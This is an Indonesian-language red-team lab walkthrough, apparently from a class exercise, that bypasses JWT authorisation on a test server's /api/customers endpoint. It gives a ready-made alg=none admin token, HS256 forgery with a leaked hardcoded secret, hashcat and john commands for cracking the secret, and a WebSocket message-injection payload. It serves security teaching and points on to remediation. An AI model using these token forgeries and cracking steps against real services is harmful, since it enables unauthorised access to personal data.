# RED TEAM — Bypass JWT terhadap `/api/customers` (Fase 2)

Target: server Kelompok 5 yang berjalan di Docker + Tailscale.
Alat: **Burp Suite** (Repeater & Intruder) — dilarang automated vulnerability
scanner. Semua serangan memanipulasi request secara manual dan **tanpa
memutus koneksi server** (bukan DDoS/flooding).

> Prasyarat: selesaikan recon dulu (lihat `RECON.md`) sampai tahu endpoint
> `/api/register`, `/api/login`, dan `/api/customers`.

---

## Ringkasan vektor serangan

| # | Vektor | Teknik | Alat |
|---|--------|--------|------|
| 1 | **JWT `alg=none`** | Token tanpa tanda tangan, `role=admin` | Burp Repeater |
| 2 | **Forge HS256** | Token ditandatangani secret lemah yang bocor | Burp Repeater / skrip |
| 3 | **Brute-force secret** | Secret lemah dibongkar offline (mode JWT) | hashcat / john |
| 4 | **Payload injection WebSocket** | Manipulasi pesan di soket terbuka | Burp / `websocat` |

Semua vektor menghasilkan akses ke `/api/customers` **tanpa mengubah role di
database** — murni memanipulasi klaim token.

---

## Step 0 — Setup Burp Suite

1. Jalankan Burp Suite (Community sudah cukup).
2. Proxy: browser → `127.0.0.1:8080` (Burp). HTTPS tidak dipakai di sini.
3. Buka **Target → Site map**, pastikan `http://<host>` sudah masuk scope.

---

## Step 1 — Dapatkan JWT sah (token "user biasa")

Di Repeater, kirim login sebagai akun biasa:

```
POST /api/login HTTP/1.1
Host: <host>
Content-Type: application/json

{"username":"attacker","password":"attacker123"}
```

Respon:

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEs...",
  "token_type": "Bearer",
  "user": { "role": "user" }
}
```

Token ini memberi akses ke `/api/profile` (200) tapi **ditolak** di
`/api/customers` (403). Bukti:

```
GET /api/customers HTTP/1.1
Authorization: Bearer <token-user>
```
→ `HTTP/1.1 403 Forbidden {"error":"Akses khusus admin","status":403}`

---

## Step 2 — Dekode JWT (memahami struktur)

Tempel token di **Burp Decoder** (base64url, tanpa `=`) atau https://jwt.io.

```
HEADER:    {"alg":"HS256","typ":"JWT"}
PAYLOAD:   {"sub":1,"username":"attacker","role":"user","iat":...,"exp":...}
SIGNATURE: <32 byte HMAC-SHA256>
```

Perhatikan: klaim **`role`** ada di dalam PAYLOAD token. Inilah yang akan
dimanipulasi.

---

## Step 3 — VEKTOR 1: Bypass dengan `alg=none`

**Mengapa rentan?** Server mempercayai nilai `alg` dari *header token*
(lihat `backend/app/auth.py`, fungsi `decode_token`). Jika `alg=none`, server
men-skip verifikasi tanda tangan sama sekali.

**Langkah:**

1. **Burp Decoder** → Encode base64url (tanpa `=`):
   - `{"alg":"none","typ":"JWT"}` → `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
   - `{"sub":999,"username":"attacker","role":"admin","iat":0,"exp":4102444800}`
     → `eyJzdWIiOjk5OSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MCwiZXhwIjo0MTAyNDQ0ODAwfQ`
2. Susun token: `header.payload.` (tiga segmen, signature kosong — diakhiri titik).
3. Kirim di **Repeater**:

```
GET /api/customers HTTP/1.1
Host: <host>
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjk5OSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MCwiZXhwIjo0MTAyNDQ0ODAwfQ.
```

**Hasil: `HTTP/1.1 200 OK`** dan data customers tampil:

```json
{"customers":[{"id":1,"name":"Marsani","email":"marsani@example.com","phone":"0812-0000-0001"}, ...]}
```

> **Verifikasi cepat via skrip** (reproduksibel untuk laporan):
> ```bash
> python scripts/bypass_jwt.py --none --target http://<host>
> ```

---

## Step 4 — VEKTOR 2: Forge HS256 dengan secret yang bocor

**Mengapa rentan?** Secret penandatangan JWT di-hardcode & lemah
(`rahasia-super-lemah`, lihat `backend/app/config.py`). Karena kode backend
ikut dikirim ke lawan (atau bocor lewat misconfiguration), attacker tahu
secretnya dan bisa menandatangani token palsu sendiri.

**Langkah** (pakai skrip `scripts/bypass_jwt.py --hs256`):

```bash
python scripts/bypass_jwt.py --hs256 --target http://<host>
```

Token dibuat persis seperti mekanisme server (`HMAC-SHA256`) dengan
`role=admin` → `/api/customers` → **200 OK**.

Di Repeater, sama seperti Step 3, tetapi header `{"alg":"HS256"}` dan token
punya signature yang valid:

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload base64url>.<signature>
```

---

## Step 5 — VEKTOR 3: Brute-force secret JWT (offline)

Kalau secret *belum* diketahui, karena secret lemah ia bisa dibongkar offline
(mode JWT HS256). Ini **di luar jaringan** — bukan serangan ke server,
sehingga tidak melanggar larangan *automated scanner* terhadap target.

Ambil token dari Step 1 (yang sah), simpan sebagai `token.txt`, lalu:

```bash
# 1) konversi token JWT -> format hash john (jwt2john)
python jwt2john.py token.txt > token.hash     # atau gunakan hashcat langsung

# 2) hashcat mode 16500 (JWT HS256)
hashcat -m 16500 token.hash wordlist.txt

# 3) john
john --format=JWT token.hash --wordlist=wordlist.txt
```

Wordlist kecil berisi kata-kata umum — termasuk secret lemah project ini.
Setelah secret ketemu, forge token seperti Step 4.

---

## Step 6 — VEKTOR 4: Payload injection di soket WebSocket

WebSocket `/ws/notifications` terbuka tanpa autentikasi (lihat `RECON.md`,
Langkah 6). Attacker dapat menyuntikkan pesan yang di-*broadcast* — misal
palsu "job_done" untuk mengelabui klien lain.

```bash
# dengan websocat (atau GUI seperti wscat / postman)
websocat ws://<host>/ws/notifications
```

Lalu kirim payload:

```json
{"type":"job_done","job_id":"fake","status":"completed","note":"manipulasi soket"}
```

Server akan me-*echo* pesan tersebut (duplex) — bukti bahwa soket terbuka
bisa disalahgunakan untuk injeksi pesan. (Pada versi patched, soket ini wajib
autentikasi.)

---

## Hasil yang dilaporkan (bukti untuk Fase 3)

1. Token user biasa → `/api/customers` → **403** (kontrol).
2. Token `alg=none`, `role=admin` → `/api/customers` → **200** (bypass).
3. Token HS256 forge `role=admin` → `/api/customers` → **200** (bypass).
4. Server **tetap hidup** sepanjang serangan (tidak ada DoS/flooding) —
   sesuai syarat soal.
5. Semua request terekam di sisi server oleh Blue Team (PCAP) untuk dianalisis.

> Lanjut ke `BLUE_TEAM.md` untuk analisis paket & remediasi.
